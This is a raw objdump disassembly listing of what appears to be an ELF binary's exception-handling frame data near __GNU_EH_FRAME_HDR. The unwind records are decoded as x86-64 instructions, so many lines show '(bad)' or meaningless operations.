    4203:	08 90 01 00 00 1c    	or     %dl,0x1c000001(%rax)
    4209:	00 00                	add    %al,(%rax)
    420b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    420e:	00 00                	add    %al,(%rax)
    4210:	60                   	(bad)  
    4211:	cf                   	iret   
    4212:	ff                   	(bad)  
    4213:	ff a6 00 00 00 00    	jmpq   *0x0(%rsi)
    4219:	41 0e                	rex.B (bad) 
    421b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4221:	02 a1 0c 07 08 00    	add    0x8070c(%rcx),%ah
    4227:	00 1c 00             	add    %bl,(%rax,%rax,1)
    422a:	00 00                	add    %al,(%rax)
    422c:	3c 00                	cmp    $0x0,%al
    422e:	00 00                	add    %al,(%rax)
    4230:	f0 cf                	lock iret 
    4232:	ff                   	(bad)  
    4233:	ff 4b 00             	decl   0x0(%rbx)
    4236:	00 00                	add    %al,(%rax)
    4238:	00 41 0e             	add    %al,0xe(%rcx)
    423b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4241:	02 46 0c             	add    0xc(%rsi),%al
    4244:	07                   	(bad)  
    4245:	08 00                	or     %al,(%rax)
    4247:	00 1c 00             	add    %bl,(%rax,%rax,1)
    424a:	00 00                	add    %al,(%rax)
    424c:	5c                   	pop    %rsp
    424d:	00 00                	add    %al,(%rax)
    424f:	00 20                	add    %ah,(%rax)
    4251:	d0 ff                	sar    %bh
    4253:	ff 97 00 00 00 00    	callq  *0x0(%rdi)
    4259:	41 0e                	rex.B (bad) 
    425b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4261:	02 92 0c 07 08 00    	add    0x8070c(%rdx),%dl
    4267:	00 1c 00             	add    %bl,(%rax,%rax,1)
    426a:	00 00                	add    %al,(%rax)
    426c:	7c 00                	jl     426e <__GNU_EH_FRAME_HDR+0x262>
    426e:	00 00                	add    %al,(%rax)
    4270:	a0 d0 ff ff 3d 00 00 	movabs 0x3dffffd0,%al
    4277:	00 00 
    4279:	41 0e                	rex.B (bad) 
    427b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4281:	78 0c                	js     428f <__GNU_EH_FRAME_HDR+0x283>
    4283:	07                   	(bad)  
    4284:	08 00                	or     %al,(%rax)
    4286:	00 00                	add    %al,(%rax)
    4288:	1c 00                	sbb    $0x0,%al
    428a:	00 00                	add    %al,(%rax)
    428c:	9c                   	pushfq 
    428d:	00 00                	add    %al,(%rax)
    428f:	00 c0                	add    %al,%al
    4291:	d0 ff                	sar    %bh
    4293:	ff 6f 00             	ljmp   *0x0(%rdi)
    4296:	00 00                	add    %al,(%rax)
    4298:	00 41 0e             	add    %al,0xe(%rcx)
    429b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    42a1:	02 6a 0c             	add    0xc(%rdx),%ch
    42a4:	07                   	(bad)  
    42a5:	08 00                	or     %al,(%rax)
    42a7:	00 1c 00             	add    %bl,(%rax,%rax,1)
    42aa:	00 00                	add    %al,(%rax)
    42ac:	bc 00 00 00 10       	mov    $0x10000000,%esp
    42b1:	d1 ff                	sar    %edi
    42b3:	ff 5b 00             	lcall  *0x0(%rbx)
    42b6:	00 00                	add    %al,(%rax)
    42b8:	00 41 0e             	add    %al,0xe(%rcx)
    42bb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    42c1:	02 56 0c             	add    0xc(%rsi),%dl
    42c4:	07                   	(bad)  
    42c5:	08 00                	or     %al,(%rax)
    42c7:	00 1c 00             	add    %bl,(%rax,%rax,1)
    42ca:	00 00                	add    %al,(%rax)
    42cc:	dc 00                	faddl  (%rax)
    42ce:	00 00                	add    %al,(%rax)
    42d0:	50                   	push   %rax
    42d1:	d1 ff                	sar    %edi
    42d3:	ff 44 00 00          	incl   0x0(%rax,%rax,1)
    42d7:	00 00                	add    %al,(%rax)
    42d9:	41 0e                	rex.B (bad) 
    42db:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    42e1:	7f 0c                	jg     42ef <__GNU_EH_FRAME_HDR+0x2e3>
    42e3:	07                   	(bad)  
    42e4:	08 00                	or     %al,(%rax)
    42e6:	00 00                	add    %al,(%rax)
    42e8:	1c 00                	sbb    $0x0,%al
    42ea:	00 00                	add    %al,(%rax)
    42ec:	fc                   	cld    
    42ed:	00 00                	add    %al,(%rax)
    42ef:	00 80 d1 ff ff 3a    	add    %al,0x3affffd1(%rax)
    42f5:	00 00                	add    %al,(%rax)
    42f7:	00 00                	add    %al,(%rax)
    42f9:	41 0e                	rex.B (bad) 
    42fb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4301:	75 0c                	jne    430f <__GNU_EH_FRAME_HDR+0x303>
    4303:	07                   	(bad)  
    4304:	08 00                	or     %al,(%rax)
    4306:	00 00                	add    %al,(%rax)
    4308:	1c 00                	sbb    $0x0,%al
    430a:	00 00                	add    %al,(%rax)
    430c:	1c 01                	sbb    $0x1,%al
    430e:	00 00                	add    %al,(%rax)
    4310:	a0 d1 ff ff 02 01 00 	movabs 0x102ffffd1,%al
    4317:	00 00 
    4319:	41 0e                	rex.B (bad) 
    431b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4321:	02 fd                	add    %ch,%bh
    4323:	0c 07                	or     $0x7,%al
    4325:	08 00                	or     %al,(%rax)
    4327:	00 18                	add    %bl,(%rax)
    4329:	00 00                	add    %al,(%rax)
    432b:	00 3c 01             	add    %bh,(%rcx,%rax,1)
    432e:	00 00                	add    %al,(%rax)
    4330:	90                   	nop
    4331:	d2 ff                	sar    %cl,%bh
    4333:	ff 1d 00 00 00 00    	lcall  *0x0(%rip)        # 4339 <__GNU_EH_FRAME_HDR+0x32d>
    4339:	41 0e                	rex.B (bad) 
    433b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4341:	00 00                	add    %al,(%rax)
    4343:	00 18                	add    %bl,(%rax)
    4345:	00 00                	add    %al,(%rax)
    4347:	00 58 01             	add    %bl,0x1(%rax)
    434a:	00 00                	add    %al,(%rax)
    434c:	94                   	xchg   %eax,%esp
    434d:	d2 ff                	sar    %cl,%bh
    434f:	ff 1d 00 00 00 00    	lcall  *0x0(%rip)        # 4355 <__GNU_EH_FRAME_HDR+0x349>
    4355:	41 0e                	rex.B (bad) 
    4357:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    435d:	00 00                	add    %al,(%rax)
    435f:	00 18                	add    %bl,(%rax)
    4361:	00 00                	add    %al,(%rax)
    4363:	00 74 01 00          	add    %dh,0x0(%rcx,%rax,1)
    4367:	00 98 d2 ff ff 19    	add    %bl,0x19ffffd2(%rax)
    436d:	00 00                	add    %al,(%rax)
    436f:	00 00                	add    %al,(%rax)
    4371:	41 0e                	rex.B (bad) 
    4373:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4379:	00 00                	add    %al,(%rax)
    437b:	00 18                	add    %bl,(%rax)
    437d:	00 00                	add    %al,(%rax)
    437f:	00 90 01 00 00 9c    	add    %dl,-0x63ffffff(%rax)
    4385:	d2 ff                	sar    %cl,%bh
    4387:	ff 15 00 00 00 00    	callq  *0x0(%rip)        # 438d <__GNU_EH_FRAME_HDR+0x381>
    438d:	41 0e                	rex.B (bad) 
    438f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4395:	00 00                	add    %al,(%rax)
    4397:	00 18                	add    %bl,(%rax)
    4399:	00 00                	add    %al,(%rax)
    439b:	00 ac 01 00 00 a0 d2 	add    %ch,-0x2d600000(%rcx,%rax,1)
    43a2:	ff                   	(bad)  
    43a3:	ff 19                	lcall  *(%rcx)
    43a5:	00 00                	add    %al,(%rax)
    43a7:	00 00                	add    %al,(%rax)
    43a9:	41 0e                	rex.B (bad) 
    43ab:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    43b1:	00 00                	add    %al,(%rax)
    43b3:	00 18                	add    %bl,(%rax)
    43b5:	00 00                	add    %al,(%rax)
    43b7:	00 c8                	add    %cl,%al
    43b9:	01 00                	add    %eax,(%rax)
    43bb:	00 a4 d2 ff ff 28 00 	add    %ah,0x28ffff(%rdx,%rdx,8)
    43c2:	00 00                	add    %al,(%rax)
    43c4:	00 41 0e             	add    %al,0xe(%rcx)
    43c7:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    43cd:	00 00                	add    %al,(%rax)
    43cf:	00 18                	add    %bl,(%rax)
    43d1:	00 00                	add    %al,(%rax)
    43d3:	00 e4                	add    %ah,%ah
    43d5:	01 00                	add    %eax,(%rax)
    43d7:	00 b8 d2 ff ff 1d    	add    %bh,0x1dffffd2(%rax)
    43dd:	00 00                	add    %al,(%rax)
    43df:	00 00                	add    %al,(%rax)
    43e1:	41 0e                	rex.B (bad) 
    43e3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    43e9:	00 00                	add    %al,(%rax)
    43eb:	00 18                	add    %bl,(%rax)
    43ed:	00 00                	add    %al,(%rax)
    43ef:	00 00                	add    %al,(%rax)
    43f1:	02 00                	add    (%rax),%al
    43f3:	00 bc d2 ff ff 1a 00 	add    %bh,0x1affff(%rdx,%rdx,8)
    43fa:	00 00                	add    %al,(%rax)
    43fc:	00 41 0e             	add    %al,0xe(%rcx)
    43ff:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4405:	00 00                	add    %al,(%rax)
    4407:	00 18                	add    %bl,(%rax)
    4409:	00 00                	add    %al,(%rax)
    440b:	00 1c 02             	add    %bl,(%rdx,%rax,1)
    440e:	00 00                	add    %al,(%rax)
    4410:	c0 d2 ff             	rcl    $0xff,%dl
    4413:	ff 15 00 00 00 00    	callq  *0x0(%rip)        # 4419 <__GNU_EH_FRAME_HDR+0x40d>
    4419:	41 0e                	rex.B (bad) 
    441b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4421:	00 00                	add    %al,(%rax)
    4423:	00 18                	add    %bl,(%rax)
    4425:	00 00                	add    %al,(%rax)
    4427:	00 38                	add    %bh,(%rax)
    4429:	02 00                	add    (%rax),%al
    442b:	00 c4                	add    %al,%ah
    442d:	d2 ff                	sar    %cl,%bh
    442f:	ff 20                	jmpq   *(%rax)
    4431:	00 00                	add    %al,(%rax)
    4433:	00 00                	add    %al,(%rax)
    4435:	41 0e                	rex.B (bad) 
    4437:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    443d:	00 00                	add    %al,(%rax)
    443f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4442:	00 00                	add    %al,(%rax)
    4444:	54                   	push   %rsp
    4445:	02 00                	add    (%rax),%al
    4447:	00 c8                	add    %cl,%al
    4449:	d2 ff                	sar    %cl,%bh
    444b:	ff 1c 00             	lcall  *(%rax,%rax,1)
    444e:	00 00                	add    %al,(%rax)
    4450:	00 41 0e             	add    %al,0xe(%rcx)
    4453:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4459:	00 00                	add    %al,(%rax)
    445b:	00 00                	add    %al,(%rax)
    445d:	00 00                	add    %al,(%rax)
    445f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4462:	00 00                	add    %al,(%rax)
    4464:	74 02                	je     4468 <__GNU_EH_FRAME_HDR+0x45c>
    4466:	00 00                	add    %al,(%rax)
    4468:	c8 d2 ff ff          	enterq $0xffd2,$0xff
    446c:	4a 00 00             	rex.WX add %al,(%rax)
    446f:	00 00                	add    %al,(%rax)
    4471:	41 0e                	rex.B (bad) 
    4473:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4479:	02 45 0c             	add    0xc(%rbp),%al
    447c:	07                   	(bad)  
    447d:	08 00                	or     %al,(%rax)
    447f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4482:	00 00                	add    %al,(%rax)
    4484:	94                   	xchg   %eax,%esp
    4485:	02 00                	add    (%rax),%al
    4487:	00 f8                	add    %bh,%al
    4489:	d2 ff                	sar    %cl,%bh
    448b:	ff 4f 01             	decl   0x1(%rdi)
    448e:	00 00                	add    %al,(%rax)
    4490:	00 41 0e             	add    %al,0xe(%rcx)
    4493:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4499:	03 4a 01             	add    0x1(%rdx),%ecx
    449c:	0c 07                	or     $0x7,%al
    449e:	08 00                	or     %al,(%rax)
    44a0:	1c 00                	sbb    $0x0,%al
    44a2:	00 00                	add    %al,(%rax)
    44a4:	b4 02                	mov    $0x2,%ah
    44a6:	00 00                	add    %al,(%rax)
    44a8:	28 d4                	sub    %dl,%ah
    44aa:	ff                   	(bad)  
    44ab:	ff                   	(bad)  
    44ac:	eb 00                	jmp    44ae <__GNU_EH_FRAME_HDR+0x4a2>
    44ae:	00 00                	add    %al,(%rax)
    44b0:	00 41 0e             	add    %al,0xe(%rcx)
    44b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    44b9:	02 e6                	add    %dh,%ah
    44bb:	0c 07                	or     $0x7,%al
    44bd:	08 00                	or     %al,(%rax)
    44bf:	00 1c 00             	add    %bl,(%rax,%rax,1)
    44c2:	00 00                	add    %al,(%rax)
    44c4:	d4                   	(bad)  
    44c5:	02 00                	add    (%rax),%al
    44c7:	00 f8                	add    %bh,%al
    44c9:	d4                   	(bad)  
    44ca:	ff                   	(bad)  
    44cb:	ff 07                	incl   (%rdi)
    44cd:	01 00                	add    %eax,(%rax)
    44cf:	00 00                	add    %al,(%rax)
    44d1:	41 0e                	rex.B (bad) 
    44d3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    44d9:	03 02                	add    (%rdx),%eax
    44db:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
    44de:	08 00                	or     %al,(%rax)
    44e0:	1c 00                	sbb    $0x0,%al
    44e2:	00 00                	add    %al,(%rax)
    44e4:	f4                   	hlt    
    44e5:	02 00                	add    (%rax),%al
    44e7:	00 b8 d6 ff ff a6    	add    %bh,-0x5900002a(%rax)
    44ed:	00 00                	add    %al,(%rax)
    44ef:	00 00                	add    %al,(%rax)
    44f1:	41 0e                	rex.B (bad) 
    44f3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    44f9:	02 a1 0c 07 08 00    	add    0x8070c(%rcx),%ah
    44ff:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4502:	00 00                	add    %al,(%rax)
    4504:	14 03                	adc    $0x3,%al
    4506:	00 00                	add    %al,(%rax)
    4508:	48 d7                	rex.W xlat %ds:(%rbx)
    450a:	ff                   	(bad)  
    450b:	ff 57 00             	callq  *0x0(%rdi)
    450e:	00 00                	add    %al,(%rax)
    4510:	00 41 0e             	add    %al,0xe(%rcx)
    4513:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4519:	02 52 0c             	add    0xc(%rdx),%dl
    451c:	07                   	(bad)  
    451d:	08 00                	or     %al,(%rax)
    451f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4522:	00 00                	add    %al,(%rax)
    4524:	34 03                	xor    $0x3,%al
    4526:	00 00                	add    %al,(%rax)
    4528:	88 d7                	mov    %dl,%bh
    452a:	ff                   	(bad)  
    452b:	ff 57 00             	callq  *0x0(%rdi)
    452e:	00 00                	add    %al,(%rax)
    4530:	00 41 0e             	add    %al,0xe(%rcx)
    4533:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4539:	02 52 0c             	add    0xc(%rdx),%dl
    453c:	07                   	(bad)  
    453d:	08 00                	or     %al,(%rax)
    453f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4542:	00 00                	add    %al,(%rax)
    4544:	54                   	push   %rsp
    4545:	03 00                	add    (%rax),%eax
    4547:	00 c8                	add    %cl,%al
    4549:	d7                   	xlat   %ds:(%rbx)
    454a:	ff                   	(bad)  
    454b:	ff 37                	pushq  (%rdi)
    454d:	01 00                	add    %eax,(%rax)
    454f:	00 00                	add    %al,(%rax)
    4551:	41 0e                	rex.B (bad) 
    4553:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4559:	03 32                	add    (%rdx),%esi
    455b:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
    455e:	08 00                	or     %al,(%rax)
    4560:	1c 00                	sbb    $0x0,%al
    4562:	00 00                	add    %al,(%rax)
    4564:	74 03                	je     4569 <__GNU_EH_FRAME_HDR+0x55d>
    4566:	00 00                	add    %al,(%rax)
    4568:	e8 d8 ff ff 87       	callq  ffffffff88004545 <__bss_start+0xffffffff87ffe545>
    456d:	00 00                	add    %al,(%rax)
    456f:	00 00                	add    %al,(%rax)
    4571:	41 0e                	rex.B (bad) 
    4573:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4579:	02 82 0c 07 08 00    	add    0x8070c(%rdx),%al
    457f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4582:	00 00                	add    %al,(%rax)
    4584:	94                   	xchg   %eax,%esp
    4585:	03 00                	add    (%rax),%eax
    4587:	00 58 d9             	add    %bl,-0x27(%rax)
    458a:	ff                   	(bad)  
    458b:	ff 84 00 00 00 00 41 	incl   0x41000000(%rax,%rax,1)
    4592:	0e                   	(bad)  
    4593:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4599:	02 7f 0c             	add    0xc(%rdi),%bh
    459c:	07                   	(bad)  
    459d:	08 00                	or     %al,(%rax)
    459f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    45a2:	00 00                	add    %al,(%rax)
    45a4:	b4 03                	mov    $0x3,%ah
    45a6:	00 00                	add    %al,(%rax)
    45a8:	c8 d9 ff ff          	enterq $0xffd9,$0xff
    45ac:	fa                   	cli    
    45ad:	00 00                	add    %al,(%rax)
    45af:	00 00                	add    %al,(%rax)
    45b1:	41 0e                	rex.B (bad) 
    45b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    45b9:	02 f5                	add    %ch,%dh
    45bb:	0c 07                	or     $0x7,%al
    45bd:	08 00                	or     %al,(%rax)
    45bf:	00 1c 00             	add    %bl,(%rax,%rax,1)
    45c2:	00 00                	add    %al,(%rax)
    45c4:	d4                   	(bad)  
    45c5:	03 00                	add    (%rax),%eax
    45c7:	00 a8 da ff ff 49    	add    %ch,0x49ffffda(%rax)
    45cd:	00 00                	add    %al,(%rax)
    45cf:	00 00                	add    %al,(%rax)
    45d1:	41 0e                	rex.B (bad) 
    45d3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    45d9:	02 44 0c 07          	add    0x7(%rsp,%rcx,1),%al
    45dd:	08 00                	or     %al,(%rax)
    45df:	00 1c 00             	add    %bl,(%rax,%rax,1)
    45e2:	00 00                	add    %al,(%rax)
    45e4:	f4                   	hlt    
    45e5:	03 00                	add    (%rax),%eax
    45e7:	00 d8                	add    %bl,%al
    45e9:	da ff                	(bad)  
    45eb:	ff 49 00             	decl   0x0(%rcx)
    45ee:	00 00                	add    %al,(%rax)
    45f0:	00 41 0e             	add    %al,0xe(%rcx)
    45f3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    45f9:	02 44 0c 07          	add    0x7(%rsp,%rcx,1),%al
    45fd:	08 00                	or     %al,(%rax)
    45ff:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4602:	00 00                	add    %al,(%rax)
    4604:	14 04                	adc    $0x4,%al
    4606:	00 00                	add    %al,(%rax)
    4608:	08 db                	or     %bl,%bl
    460a:	ff                   	(bad)  
    460b:	ff 99 00 00 00 00    	lcall  *0x0(%rcx)
    4611:	41 0e                	rex.B (bad) 
    4613:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4619:	02 94 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%dl
    4620:	1c 00                	sbb    $0x0,%al
    4622:	00 00                	add    %al,(%rax)
    4624:	34 04                	xor    $0x4,%al
    4626:	00 00                	add    %al,(%rax)
    4628:	88 db                	mov    %bl,%bl
    462a:	ff                   	(bad)  
    462b:	ff 99 00 00 00 00    	lcall  *0x0(%rcx)
    4631:	41 0e                	rex.B (bad) 
    4633:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4639:	02 94 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%dl
    4640:	1c 00                	sbb    $0x0,%al
    4642:	00 00                	add    %al,(%rax)
    4644:	54                   	push   %rsp
    4645:	04 00                	add    $0x0,%al
    4647:	00 08                	add    %cl,(%rax)
    4649:	dc ff                	fdivr  %st,%st(7)
    464b:	ff ae 00 00 00 00    	ljmp   *0x0(%rsi)
    4651:	41 0e                	rex.B (bad) 
    4653:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4659:	02 a9 0c 07 08 00    	add    0x8070c(%rcx),%ch
    465f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4662:	00 00                	add    %al,(%rax)
    4664:	74 04                	je     466a <__GNU_EH_FRAME_HDR+0x65e>
    4666:	00 00                	add    %al,(%rax)
    4668:	98                   	cwtl   
    4669:	dc ff                	fdivr  %st,%st(7)
    466b:	ff a1 00 00 00 00    	jmpq   *0x0(%rcx)
    4671:	41 0e                	rex.B (bad) 
    4673:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4679:	02 9c 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%bl
    4680:	1c 00                	sbb    $0x0,%al
    4682:	00 00                	add    %al,(%rax)
    4684:	94                   	xchg   %eax,%esp
    4685:	04 00                	add    $0x0,%al
    4687:	00 28                	add    %ch,(%rax)
    4689:	dd ff                	(bad)  
    468b:	ff af 00 00 00 00    	ljmp   *0x0(%rdi)
    4691:	41 0e                	rex.B (bad) 
    4693:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4699:	02 aa 0c 07 08 00    	add    0x8070c(%rdx),%ch
    469f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    46a2:	00 00                	add    %al,(%rax)
    46a4:	b4 04                	mov    $0x4,%ah
    46a6:	00 00                	add    %al,(%rax)
    46a8:	88 de                	mov    %bl,%dh
    46aa:	ff                   	(bad)  
    46ab:	ff 62 00             	jmpq   *0x0(%rdx)
    46ae:	00 00                	add    %al,(%rax)
    46b0:	00 41 0e             	add    %al,0xe(%rcx)
    46b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    46b9:	02 5d 0c             	add    0xc(%rbp),%bl
    46bc:	07                   	(bad)  
    46bd:	08 00                	or     %al,(%rax)
    46bf:	00 1c 00             	add    %bl,(%rax,%rax,1)
    46c2:	00 00                	add    %al,(%rax)
    46c4:	d4                   	(bad)  
    46c5:	04 00                	add    $0x0,%al
    46c7:	00 d8                	add    %bl,%al
    46c9:	de ff                	fdivrp %st,%st(7)
    46cb:	ff ab 00 00 00 00    	ljmp   *0x0(%rbx)
    46d1:	41 0e                	rex.B (bad) 
    46d3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    46d9:	02 a6 0c 07 08 00    	add    0x8070c(%rsi),%ah
    46df:	00 1c 00             	add    %bl,(%rax,%rax,1)
    46e2:	00 00                	add    %al,(%rax)
    46e4:	f4                   	hlt    
    46e5:	04 00                	add    $0x0,%al
    46e7:	00 68 df             	add    %ch,-0x21(%rax)
    46ea:	ff                   	(bad)  
    46eb:	ff d3                	callq  *%rbx
    46ed:	00 00                	add    %al,(%rax)
    46ef:	00 00                	add    %al,(%rax)
    46f1:	41 0e                	rex.B (bad) 
    46f3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    46f9:	02 ce                	add    %dh,%cl
    46fb:	0c 07                	or     $0x7,%al
    46fd:	08 00                	or     %al,(%rax)
    46ff:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4702:	00 00                	add    %al,(%rax)
    4704:	14 05                	adc    $0x5,%al
    4706:	00 00                	add    %al,(%rax)
    4708:	28 e0                	sub    %ah,%al
    470a:	ff                   	(bad)  
    470b:	ff 46 01             	incl   0x1(%rsi)
    470e:	00 00                	add    %al,(%rax)
    4710:	00 41 0e             	add    %al,0xe(%rcx)
    4713:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4719:	03 41 01             	add    0x1(%rcx),%eax
    471c:	0c 07                	or     $0x7,%al
    471e:	08 00                	or     %al,(%rax)
    4720:	1c 00                	sbb    $0x0,%al
    4722:	00 00                	add    %al,(%rax)
    4724:	34 05                	xor    $0x5,%al
    4726:	00 00                	add    %al,(%rax)
    4728:	58                   	pop    %rax
    4729:	e1 ff                	loope  472a <__GNU_EH_FRAME_HDR+0x71e>
    472b:	ff                   	(bad)  
    472c:	b9 00 00 00 00       	mov    $0x0,%ecx
    4731:	41 0e                	rex.B (bad) 
    4733:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4739:	02 b4 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%dh
    4740:	1c 00                	sbb    $0x0,%al
    4742:	00 00                	add    %al,(%rax)
    4744:	54                   	push   %rsp
    4745:	05 00 00 f8 e1       	add    $0xe1f80000,%eax
    474a:	ff                   	(bad)  
    474b:	ff                   	(bad)  
    474c:	3a 01                	cmp    (%rcx),%al
    474e:	00 00                	add    %al,(%rax)
    4750:	00 41 0e             	add    %al,0xe(%rcx)
    4753:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4759:	03 35 01 0c 07 08    	add    0x8070c01(%rip),%esi        # 8075360 <__bss_start+0x806f360>
    475f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4762:	00 00                	add    %al,(%rax)
    4764:	74 05                	je     476b <__GNU_EH_FRAME_HDR+0x75f>
    4766:	00 00                	add    %al,(%rax)
    4768:	18 e3                	sbb    %ah,%bl
    476a:	ff                   	(bad)  
    476b:	ff ab 00 00 00 00    	ljmp   *0x0(%rbx)
    4771:	41 0e                	rex.B (bad) 
    4773:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4779:	02 a6 0c 07 08 00    	add    0x8070c(%rsi),%ah
    477f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4782:	00 00                	add    %al,(%rax)
    4784:	94                   	xchg   %eax,%esp
    4785:	05 00 00 a8 e3       	add    $0xe3a80000,%eax
    478a:	ff                   	(bad)  
    478b:	ff 50 00             	callq  *0x0(%rax)
    478e:	00 00                	add    %al,(%rax)
    4790:	00 41 0e             	add    %al,0xe(%rcx)
    4793:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4799:	02 4b 0c             	add    0xc(%rbx),%cl
    479c:	07                   	(bad)  
    479d:	08 00                	or     %al,(%rax)
    479f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    47a2:	00 00                	add    %al,(%rax)
    47a4:	b4 05                	mov    $0x5,%ah
    47a6:	00 00                	add    %al,(%rax)
    47a8:	d8 e3                	fsub   %st(3),%st
    47aa:	ff                   	(bad)  
    47ab:	ff 5b 01             	lcall  *0x1(%rbx)
    47ae:	00 00                	add    %al,(%rax)
    47b0:	00 41 0e             	add    %al,0xe(%rcx)
    47b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    47b9:	03 56 01             	add    0x1(%rsi),%edx
    47bc:	0c 07                	or     $0x7,%al
    47be:	08 00                	or     %al,(%rax)
    47c0:	1c 00                	sbb    $0x0,%al
    47c2:	00 00                	add    %al,(%rax)
    47c4:	d4                   	(bad)  
    47c5:	05 00 00 18 e5       	add    $0xe5180000,%eax
    47ca:	ff                   	(bad)  
    47cb:	ff a1 00 00 00 00    	jmpq   *0x0(%rcx)
    47d1:	41 0e                	rex.B (bad) 
    47d3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    47d9:	02 9c 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%bl
    47e0:	1c 00                	sbb    $0x0,%al
    47e2:	00 00                	add    %al,(%rax)
    47e4:	f4                   	hlt    
    47e5:	05 00 00 a8 e5       	add    $0xe5a80000,%eax
    47ea:	ff                   	(bad)  
    47eb:	ff                   	(bad)  
    47ec:	7a 01                	jp     47ef <__GNU_EH_FRAME_HDR+0x7e3>
    47ee:	00 00                	add    %al,(%rax)
    47f0:	00 41 0e             	add    %al,0xe(%rcx)
    47f3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    47f9:	03 75 01             	add    0x1(%rbp),%esi
    47fc:	0c 07                	or     $0x7,%al
    47fe:	08 00                	or     %al,(%rax)
    4800:	1c 00                	sbb    $0x0,%al
    4802:	00 00                	add    %al,(%rax)
    4804:	14 06                	adc    $0x6,%al
    4806:	00 00                	add    %al,(%rax)
    4808:	08 e7                	or     %ah,%bh
    480a:	ff                   	(bad)  
    480b:	ff                   	(bad)  
    480c:	7a 01                	jp     480f <__GNU_EH_FRAME_HDR+0x803>
    480e:	00 00                	add    %al,(%rax)
    4810:	00 41 0e             	add    %al,0xe(%rcx)
    4813:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4819:	03 75 01             	add    0x1(%rbp),%esi
    481c:	0c 07                	or     $0x7,%al
    481e:	08 00                	or     %al,(%rax)
    4820:	1c 00                	sbb    $0x0,%al
    4822:	00 00                	add    %al,(%rax)
    4824:	34 06                	xor    $0x6,%al
    4826:	00 00                	add    %al,(%rax)
    4828:	68 e8 ff ff 8c       	pushq  $0xffffffff8cffffe8
    482d:	01 00                	add    %eax,(%rax)
    482f:	00 00                	add    %al,(%rax)
    4831:	41 0e                	rex.B (bad) 
    4833:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4839:	03 87 01 0c 07 08    	add    0x8070c01(%rdi),%eax
    483f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4842:	00 00                	add    %al,(%rax)
